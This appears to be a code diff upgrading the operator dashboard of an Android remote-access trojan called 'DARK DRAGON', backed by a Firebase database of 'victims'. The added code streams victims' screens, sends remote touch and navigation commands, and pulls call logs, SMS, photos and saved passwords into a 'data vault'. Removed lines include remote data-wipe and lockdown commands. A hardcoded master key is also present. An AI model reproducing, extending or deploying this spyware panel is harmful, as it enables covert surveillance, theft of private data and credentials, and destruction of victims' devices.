@@ -2,33 +2,35 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | SUPREME MASTER v6.5</title>
+    <title>DARK DRAGON | OVERLORD v2</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        /* උඹේ පරණ Styles ඔක්කොම තියෙනවා, මම අලුත් Glow Effect එකක් ඇඩ් කළා */
-        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; --cyan: #00ffff; --gold: #ffd700; --green: #00ff00; }
-        body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
+        :root { --red: #ff0000; --cyan: #00ffff; --gold: #ffd700; --bg: #050000; --card: rgba(20, 0, 0, 0.9); }
+        body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         
-        /* Dashboard Styling */
         #dashboard { display: none; height: 100vh; overflow-y: auto; }
-        .tabs { display: flex; background: #0a0000; border-bottom: 2px solid var(--neon-red); sticky: top; }
-        .tab { padding: 15px; cursor: pointer; font-size: 11px; border-right: 1px solid var(--dark-red); transition: 0.3s; }
-        .tab.active { background: var(--neon-red); color: black; font-weight: bold; }
+        .tabs { display: flex; background: #000; border-bottom: 2px solid var(--red); overflow-x: auto; sticky: top; z-index: 1000; }
+        .tab { padding: 15px 20px; cursor: pointer; font-size: 11px; border-right: 1px solid #300; white-space: nowrap; transition: 0.3s; color: #888; font-weight: bold; }
+        .tab.active { background: var(--red); color: black; box-shadow: 0 0 15px var(--red); }
         
-        /* Monitor Section */
-        .live-stream { width: 100%; height: 400px; background: #000; border: 2px solid var(--cyan); margin-bottom: 10px; display: flex; align-items: center; justify-content: center; position: relative; }
-        #live-screen-img { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .stealth-indicator { position: absolute; top: 10px; right: 10px; color: var(--green); font-size: 10px; animation: blink 1s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
+        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 15px; }
+        .card { background: var(--card); border: 1px solid #400; padding: 15px; border-radius: 4px; position: relative; }
+        .card h3 { color: var(--cyan); font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 8px; margin-top: 0; }
         
-        /* Layout */
-        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
-        .card { background: rgba(15, 0, 0, 0.9); border: 1px solid var(--dark-red); padding: 15px; border-radius: 5px; }
-        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 10px; cursor: pointer; font-size: 11px; margin: 2px; }
-        button:hover { background: var(--neon-red); color: black; }
-        .btn-war { border-color: var(--cyan); color: var(--cyan); font-weight: bold; }
+        /* Screen Monitor with Mouse Control */
+        .monitor-wrapper { position: relative; width: 300px; height: 600px; margin: 0 auto; border: 5px solid #222; border-radius: 20px; overflow: hidden; background: #000; cursor: crosshair; }
+        #live-screen-img { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* Data Vault Lists */
+        .vault-list { height: 200px; overflow-y: auto; background: #000; font-size: 10px; color: #aaa; padding: 5px; border: 1px solid #200; }
+        .vault-item { padding: 5px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; }
+        
+        button { background: #1a0000; color: var(--red); border: 1px solid var(--red); padding: 8px 10px; cursor: pointer; font-size: 10px; margin: 2px; }
+        button:hover { background: var(--red); color: black; }
+        .btn-cyan { border-color: var(--cyan); color: var(--cyan); }
+        .btn-gold { border-color: var(--gold); color: var(--gold); }
     </style>
 </head>
 <body>
@@ -36,135 +38,197 @@
 <canvas id="matrixCanvas"></canvas>
 
 <div id="login-box" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); border:2px solid red; padding:50px; background:black; text-align:center;">
-    <h2 style="color:var(--neon-red)">DRAGON SUPREME ACCESS</h2>
-    <input type="password" id="master-code" placeholder="ENTER MASTER CODE" style="background:#110000; color:red; border:1px solid red; padding:10px;"><br><br>
-    <button onclick="unlock()">AUTH & UNLOCK SYSTEM</button>
+    <h1>OVERLORD ACCESS</h1>
+    <input type="password" id="master-code" placeholder="ENTER MASTER KEY" style="background:black; color:red; border:1px solid red; padding:15px; width: 250px; text-align:center;"><br><br>
+    <button onclick="unlock()" style="width: 280px; padding: 15px;">BOOT SYSTEM</button>
 </div>
 
 <div id="dashboard">
-    <header style="text-align:center; padding:10px; border-bottom:1px solid red;">
-        <h3>DRAGON COMMAND CENTER [SUPREME MASTER v6.5]</h3>
-        <div style="font-size:12px; color:var(--cyan)">TARGET: <span id="target-id-display">NONE</span> | STATUS: <span id="target-status-display">DISCONNECTED</span></div>
+    <header style="padding:15px; border-bottom:1px solid red; display: flex; justify-content: space-between; align-items: center; background: #050000;">
+        <span style="color: var(--gold);">DRAGON OVERLORD v8.0</span>
+        <span style="color: var(--cyan);">LOCKED ON: <b id="target-name-display">NONE</b></span>
+        <button id="deselect-btn" style="display:none;" onclick="deselectTarget()">DESELECT</button>
     </header>
 
     <div class="tabs">
-        <div class="tab active" onclick="showTab('nodes')">👥 NODES</div>
-        <div class="tab" onclick="showTab('spy')">👁️ LIVE SPY</div>
+        <div class="tab active" onclick="showTab('nodes')">👥 TARGETS</div>
+        <div class="tab" onclick="showTab('control')">🖱️ REMOTE DESKTOP</div>
+        <div class="tab" onclick="showTab('vault')">📂 DATA VAULT</div>
+        <div class="tab" onclick="showTab('settings')">⚙️ QUICK SETTINGS</div>
         <div class="tab" onclick="showTab('war')">⚔️ WAR MODE</div>
-        <div class="tab" onclick="showTab('data')">📂 EXTRACT</div>
     </div>
 
     <div class="container">
-        <div id="spy" class="panel" style="display:none; grid-column: 1/-1;">
-            <div class="card">
-                <h3>📺 STEALTH LIVE MONITOR</h3>
-                <div class="live-stream">
-                    <div class="stealth-indicator" id="stealth-mode">🛰️ STEALTH ACTIVE</div>
-                    <img id="live-screen-img" src="">
-                    <span id="wait-msg">WAITING FOR TARGET...</span>
+        <div id="control" class="panel" style="display:none; grid-column: 1/-1;">
+            <div style="display: flex; gap: 20px; justify-content: center;">
+                <div class="card">
+                    <h3>📱 LIVE SCREEN CONTROL</h3>
+                    <div class="monitor-wrapper" id="screen-monitor" onclick="handleScreenClick(event)">
+                        <img id="live-screen-img" src="">
+                    </div>
+                    <p style="font-size: 10px; text-align:center; color: #666;">Click on screen to simulate touch on device</p>
                 </div>
-                <button onclick="sendCmd('take_screenshot')">REFRESH SCREEN</button>
-                <button class="btn-war" onclick="sendCmd('start_stream')">START LIVE STREAM</button>
-                <button onclick="sendCmd('stop_stream')">STOP STREAM</button>
+                <div class="card" style="width: 300px;">
+                    <h3>⚡ NAVIGATION</h3>
+                    <button style="width: 100%" onclick="sendCmd('key_back')">⬅️ BACK</button>
+                    <button style="width: 100%" onclick="sendCmd('key_home')">🏠 HOME</button>
+                    <button style="width: 100%" onclick="sendCmd('key_recent')">⬜ RECENT</button>
+                    <hr>
+                    <h3>🔋 SYSTEM STATS</h3>
+                    <div id="battery-status" style="color: lime;">Battery: --%</div>
+                    <div id="connection-type" style="color: var(--cyan);">Net: --</div>
+                </div>
             </div>
         </div>
 
-        <div id="war" class="panel" style="display:none;">
+        <div id="vault" class="panel" style="display:none; grid-column: 1/-1;">
+            <div class="container" style="padding:0;">
+                <div class="card">
+                    <h3>📞 CALL LOGS & SMS</h3>
+                    <div class="vault-list" id="call-vault">Auto-Syncing...</div>
+                </div>
+                <div class="card">
+                    <h3>📸 MEDIA (PHOTOS/VIDEOS)</h3>
+                    <div class="vault-list" id="media-vault">Auto-Syncing...</div>
+                </div>
+                <div class="card">
+                    <h3>🔐 SAVED PASSWORDS</h3>
+                    <div class="vault-list" id="pass-vault">Checking internal storage...</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="settings" class="panel" style="display:none;">
             <div class="card">
-                <h3>☣️ SYSTEM DESTRUCTION</h3>
-                <button class="btn-war" onclick="sendCmd('nuclear_lock')">NUCLEAR LOCKDOWN</button>
-                <button style="color:white; background:red;" onclick="sendCmd('wipe_data')">FULL WIPE DATA</button>
-                <button onclick="sendCmd('max_vol_alarm')">PLAY MAX ALARM</button>
+                <h3>🎛️ CONTROL PANEL</h3>
+                <button class="btn-cyan" onclick="sendCmd('toggle_wifi')">WIFI ON/OFF</button>
+                <button class="btn-cyan" onclick="sendCmd('toggle_bt')">BLUETOOTH ON/OFF</button>
+                <button class="btn-cyan" onclick="sendCmd('toggle_torch')">TORCH ON/OFF</button>
+                <button class="btn-cyan" onclick="sendCmd('toggle_data')">MOBILE DATA ON/OFF</button>
+                <button class="btn-gold" onclick="sendCmd('volume_max')">MAX VOLUME</button>
+                <button class="btn-gold" onclick="sendCmd('set_silent')">SILENT MODE</button>
             </div>
         </div>
 
         <div id="nodes" class="panel">
             <div class="card" style="grid-column: 1/-1;">
-                <h3>👥 ACTIVE TARGETS</h3>
-                <table id="victim-table" style="width:100%; color:white; font-size:12px;">
-                    </table>
+                <h3>📡 ONLINE NODES</h3>
+                <table id="victim-table" style="width:100%; text-align:left; font-size:12px; color: white;">
+                    <tr style="color: var(--cyan);"><th>USER/NAME</th><th>MODEL</th><th>IP</th><th>STATUS</th><th>ACTION</th></tr>
+                </table>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
-    const firebaseConfig = { 
-        databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" 
-    };
+    const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     let activeTarget = null;
 
     function unlock() {
         const code = document.getElementById('master-code').value;
-        if(code === "Akindu@Dewshan20241118") { // උඹේ රහස් කේතය
+        if(code === "Akindu@Dewshan20241118") {
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
-            startMatrix();
-            loadNodes();
+            startMatrix(); loadNodes();
         } else { alert("ACCESS DENIED!"); }
     }
 
     function loadNodes() {
         db.ref('victims').on('value', (snap) => {
             const table = document.getElementById('victim-table');
-            table.innerHTML = "<tr><th>ID</th><th>DEVICE</th><th>STATUS</th><th>ACTION</th></tr>";
+            table.innerHTML = "<tr><th>USER/NAME</th><th>MODEL</th><th>IP</th><th>STATUS</th><th>ACTION</th></tr>";
             snap.forEach(child => {
                 const v = child.val();
                 table.innerHTML += `<tr>
-                    <td>${v.target}</td>
+                    <td>${v.real_name || v.target}</td>
                     <td>${v.model}</td>
+                    <td>${v.ip || '0.0.0.0'}</td>
                     <td style="color:lime">ONLINE</td>
-                    <td><button onclick="selectNode('${child.key}')">CONNECT</button></td>
+                    <td><button onclick="selectTarget('${child.key}', '${v.real_name || v.target}')">CONNECT</button></td>
                 </tr>`;
             });
         });
     }
 
-    function selectNode(id) {
-        activeTarget = id;
-        document.getElementById('target-id-display').innerText = id;
-        document.getElementById('target-status-display').innerText = "CONNECTED";
+    function selectTarget(key, name) {
+        activeTarget = key;
+        document.getElementById('target-name-display').innerText = name.toUpperCase();
+        document.getElementById('deselect-btn').style.display = 'inline-block';
         
-        // පින්තූර ස්ට්‍රීම් එක ලයිව් බලන්න
-        db.ref('screens/' + id).on('value', (snap) => {
+        // Auto-Scrape Data Start
+        syncVault(key);
+
+        // Live Screen Monitor
+        db.ref('screens/' + key).on('value', (snap) => {
+            if(snap.val()) document.getElementById('live-screen-img').src = snap.val().img;
+        });
+
+        // Device Info Sync
+        db.ref('status/' + key).on('value', (snap) => {
             if(snap.val()) {
-                document.getElementById('live-screen-img').src = snap.val().img;
-                document.getElementById('wait-msg').style.display = 'none';
+                document.getElementById('battery-status').innerText = "Battery: " + snap.val().battery + "%";
+                document.getElementById('connection-type').innerText = "Net: " + snap.val().net_type;
             }
         });
     }
 
-    function sendCmd(action) {
-        if(!activeTarget) return alert("SELECT A TARGET FIRST!");
-        db.ref('commands/' + activeTarget).set({
-            action: action,
-            time: Date.now()
+    function deselectTarget() {
+        activeTarget = null;
+        document.getElementById('target-name-display').innerText = "NONE";
+        document.getElementById('deselect-btn').style.display = 'none';
+        location.reload(); // Reset connection
+    }
+
+    // Mouse Control Logic
+    function handleScreenClick(e) {
+        if(!activeTarget) return;
+        const rect = e.target.getBoundingClientRect();
+        const x = ((e.clientX - rect.left) / rect.width).toFixed(2);
+        const y = ((e.clientY - rect.top) / rect.height).toFixed(2);
+        db.ref('commands/' + activeTarget).set({ action: 'touch', x: x, y: y, time: Date.now() });
+    }
+
+    function syncVault(key) {
+        // Fetch Call Logs
+        db.ref('vault/' + key + '/calls').limitToLast(10).on('value', snap => {
+            let html = "";
+            snap.forEach(c => { html += `<div class="vault-item"><span>${c.val().num}</span><span>${c.val().type}</span></div>`; });
+            document.getElementById('call-vault').innerHTML = html;
         });
+        // Fetch Media
+        db.ref('vault/' + key + '/media').on('value', snap => {
+            let html = "";
+            snap.forEach(m => { html += `<div class="vault-item"><span>${m.val().name}</span><button onclick="window.open('${m.val().url}')">DL</button></div>`; });
+            document.getElementById('media-vault').innerHTML = html;
+        });
+    }
+
+    function sendCmd(action) {
+        if(!activeTarget) return alert("NO TARGET SELECTED!");
+        db.ref('commands/' + activeTarget).set({ action: action, time: Date.now() });
     }
 
     function showTab(id) {
         document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.getElementById(id).style.display = 'grid';
+        event.currentTarget.classList.add('active');
     }
 
-    // Matrix Background Logic
     function startMatrix() {
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const columns = Math.floor(canvas.width / 20);
-        const drops = Array(columns).fill(1);
+        const drops = Array(Math.floor(canvas.width/20)).fill(1);
         setInterval(() => {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
             ctx.fillStyle = '#f00';
             drops.forEach((y, i) => {
-                ctx.fillText(String.fromCharCode(Math.random() * 128), i * 20, y * 20);
-                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
+                if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             });
         }, 50);
